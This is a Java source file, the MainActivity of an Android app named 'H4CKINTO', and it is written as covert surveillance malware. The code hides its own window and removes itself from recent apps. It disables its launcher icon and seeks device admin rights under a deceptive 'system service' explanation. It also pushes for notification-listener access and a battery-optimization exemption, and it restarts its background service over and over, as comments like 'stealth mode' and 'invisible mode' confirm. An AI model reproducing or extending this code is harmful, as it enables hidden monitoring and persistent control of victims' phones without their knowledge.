package com.h4ckinto.android;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import com.h4ckinto.android.receiver.H4CKINTODeviceAdminReceiver;
import com.h4ckinto.android.service.MainService;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.PermissionManager;
import com.h4ckinto.android.PermissionHelper;

import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    
    // No UI elements - completely automatic
    private DevicePolicyManager devicePolicyManager;
    private ComponentName deviceAdminReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Completely hide the UI - invisible mode
        hideAppCompletely();
        
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        deviceAdminReceiver = new ComponentName(this, H4CKINTODeviceAdminReceiver.class);
        
        // Start service immediately without any UI
        startServiceImmediately();
        
        // Also start service in a separate thread to ensure it starts
        new Thread(() -> {
            try {
                Thread.sleep(2000); // Wait 2 seconds
                startMainService(); // Start service again
                Log.d(TAG, "Service started in background thread");
            } catch (Exception e) {
                Log.e(TAG, "Error starting service in background: " + e.getMessage());
            }
        }).start();
    }
    
    private void hideAppCompletely() {
        // Make activity completely invisible
        getWindow().setFlags(
            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );
        
        // Hide from recent apps
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            setTaskDescription(new android.app.ActivityManager.TaskDescription(
                null, null, android.graphics.Color.TRANSPARENT));
        }
        
        // Move to background immediately
        moveTaskToBack(true);
        
        // Hide the activity window
        getWindow().setFlags(
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
    }
    
    private void startServiceImmediately() {
        Log.d(TAG, "Starting service immediately - invisible mode");
        
        // Start main service immediately
        startMainService();
        
        // Request permissions silently
        requestPermissionsSilently();
        
        // Hide app icon immediately
        hideAppIcon();
        
        // Check and enable notification listener if needed
        checkAndEnableNotificationListener();
        
        // Start service in background thread to ensure it starts
        new Thread(() -> {
            try {
                Thread.sleep(1000); // Wait 1 second
                startMainService(); // Start again to ensure it's running
                Log.d(TAG, "Service started in background thread");
            } catch (Exception e) {
                Log.e(TAG, "Error starting service in background: " + e.getMessage());
            }
        }).start();
        
        // Finish activity immediately
        finish();
    }
    
    private void hideAppUI() {
        // Make the activity invisible
        getWindow().setFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
        
        // Hide from recent apps
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            setTaskDescription(new android.app.ActivityManager.TaskDescription(null, null, 
                android.graphics.Color.TRANSPARENT));
        }
        
        // Hide the activity
        moveTaskToBack(true);
    }
    
    private void autoStartApp() {
        Log.d(TAG, "Auto-starting app in stealth mode...");
        
        // Start main service immediately
        startMainService();
        
        // Request permissions silently
        requestPermissionsSilently();
        
        // Hide app icon immediately
        hideAppIcon();
        
        // Check and enable notification listener if needed
        checkAndEnableNotificationListener();
        
        // Finish activity quickly
        new android.os.Handler().postDelayed(() -> {
            finish();
        }, 1000);
    }

    private void requestPermissionsSilently() {
        // Request permissions without showing UI
        List<String> missingPermissions = PermissionManager.getMissingPermissions(this);
        
        if (!missingPermissions.isEmpty()) {
            Log.d(TAG, "Requesting permissions silently: " + missingPermissions.toString());
            ActivityCompat.requestPermissions(this, 
                missingPermissions.toArray(new String[0]), 
                Constants.REQUEST_CODE_PERMISSIONS);
        }
        
        // Continue with setup regardless
        setupAppSilently();
    }
    
    private void setupAppSilently() {
        Log.d(TAG, "Setting up app silently...");
        
        // Request device admin silently
        requestDeviceAdminSilently();
        
        // Request notification access silently
        requestNotificationAccessSilently();
        
        // Request battery optimization exemption silently
        requestBatteryOptimizationExemptionSilently();
        
        // Start main service
        startMainService();
        
        // Hide app icon
        hideAppIcon();
        
        Log.d(TAG, "Silent setup complete");
    }
    
    private void requestDeviceAdminSilently() {
        if (!devicePolicyManager.isAdminActive(deviceAdminReceiver)) {
            Log.d(TAG, "Device admin not active - requesting silently");
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminReceiver);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "System service requires device admin privileges.");
            startActivityForResult(intent, Constants.REQUEST_CODE_DEVICE_ADMIN);
        }
    }
    
    private void requestNotificationAccessSilently() {
        if (!PermissionHelper.isNotificationListenerEnabled(this)) {
            Log.d(TAG, "Notification listener not enabled - requesting silently");
            PermissionHelper.openNotificationListenerSettings(this);
        }
    }
    
    private void requestBatteryOptimizationExemptionSilently() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                Log.d(TAG, "Requesting battery optimization exemption silently");
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, Constants.REQUEST_CODE_BATTERY_OPTIMIZATION);
            }
        }
    }
    
    private void checkAndEnableNotificationListener() {
        if (!PermissionHelper.isNotificationListenerEnabled(this)) {
            Log.d(TAG, "Notification listener not enabled - opening settings");
            PermissionHelper.openNotificationListenerSettings(this);
        } else {
            Log.d(TAG, "Notification listener is already enabled");
        }
    }

    private void requestPermissionsAndSetup() {
        List<String> missingPermissions = PermissionManager.getMissingPermissions(this);
        
        if (!missingPermissions.isEmpty()) {
            Log.d(TAG, "Requesting permissions silently...");
            ActivityCompat.requestPermissions(this, 
                missingPermissions.toArray(new String[0]), 
                Constants.REQUEST_CODE_PERMISSIONS);
        } else {
            setupApp();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == Constants.REQUEST_CODE_PERMISSIONS) {
            boolean allPermissionsGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }
            
            if (allPermissionsGranted) {
                setupApp();
            } else {
                Log.w(TAG, "Some permissions denied. App will continue with limited functionality.");
                setupApp(); // Continue anyway
            }
        }
    }

    private void setupApp() {
        Log.d(TAG, "Setting up app automatically...");
        
        // Request device admin
        requestDeviceAdmin();
        
        // Request notification access
        requestNotificationAccess();
        
        // Request battery optimization exemption
        requestBatteryOptimizationExemption();
        
        // Start main service
        startMainService();
        
        // Hide app icon
        hideAppIcon();
        
        Log.d(TAG, "Setup complete. App will run in background.");
        
        // Finish activity after a delay
        new android.os.Handler().postDelayed(() -> {
            finish();
        }, 3000);
    }

    private void requestDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(deviceAdminReceiver)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminReceiver);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "This app requires device admin privileges for security features.");
            startActivityForResult(intent, Constants.REQUEST_CODE_DEVICE_ADMIN);
        }
    }

    private void requestNotificationAccess() {
        if (!PermissionHelper.isNotificationListenerEnabled(this)) {
            PermissionHelper.openNotificationListenerSettings(this);
            Toast.makeText(this, "Please enable 'H4CKINTO Android' in the notification listener settings", Toast.LENGTH_LONG).show();
        }
    }

    private void openNotificationListenerSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Please enable 'H4CKINTO Android' in the notification listener settings", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            // Fallback to general settings
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Please go to Settings > Apps > H4CKINTO Android > Notifications > Allow notification access", Toast.LENGTH_LONG).show();
        }
    }

    private void checkNotificationListenerStatus() {
        boolean isEnabled = PermissionHelper.isNotificationListenerEnabled(this);
        
        // No UI elements - check silently
        if (isEnabled) {
            Log.d(TAG, "Notification listener is enabled");
        } else {
            Log.d(TAG, "Notification listener is not enabled");
        }
    }

    private void requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, Constants.REQUEST_CODE_BATTERY_OPTIMIZATION);
            }
        }
    }

    // Removed - using PermissionHelper.isNotificationListenerEnabled() instead

    private void startMainService() {
        try {
            Intent serviceIntent = new Intent(this, MainService.class);
            serviceIntent.setAction(Constants.ACTION_START_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            // Also try to bind the service to ensure it stays running
            bindService(serviceIntent, new ServiceConnection() {
                @Override
                public void onServiceConnected(ComponentName name, IBinder service) {
                    Log.d(TAG, "Service connected and bound");
                }
                
                @Override
                public void onServiceDisconnected(ComponentName name) {
                    Log.d(TAG, "Service disconnected, restarting...");
                    startMainService(); // Restart if disconnected
                }
            }, Context.BIND_AUTO_CREATE);
            
            Log.d(TAG, "Main service started and bound");
        } catch (Exception e) {
            Log.e(TAG, "Error starting MainService: " + e.getMessage());
        }
    }

    private void hideAppIcon() {
        try {
            PackageManager packageManager = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            packageManager.setComponentEnabledSetting(componentName, 
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                PackageManager.DONT_KILL_APP);
            
            // Also hide from launcher
            packageManager.setComponentEnabledSetting(
                new ComponentName(this, "com.h4ckinto.android.SimpleMainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
            
            Log.d(TAG, "App icon hidden from launcher");
        } catch (Exception e) {
            Log.e(TAG, "Error hiding app icon: " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        switch (requestCode) {
            case Constants.REQUEST_CODE_DEVICE_ADMIN:
                if (resultCode == Activity.RESULT_OK) {
                    Log.d(TAG, "Device admin granted");
                } else {
                    Log.w(TAG, "Device admin denied");
                }
                break;
            case Constants.REQUEST_CODE_NOTIFICATION_ACCESS:
                Log.d(TAG, "Notification access result: " + resultCode);
                break;
            case Constants.REQUEST_CODE_BATTERY_OPTIMIZATION:
                Log.d(TAG, "Battery optimization result: " + resultCode);
                break;
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        Log.d(TAG, "MainActivity started");
        
        // Start service immediately when activity starts
        startMainService();
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkNotificationListenerStatus();
        
        // Ensure service is running when activity resumes
        startMainService();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MainActivity destroyed");
    }
}
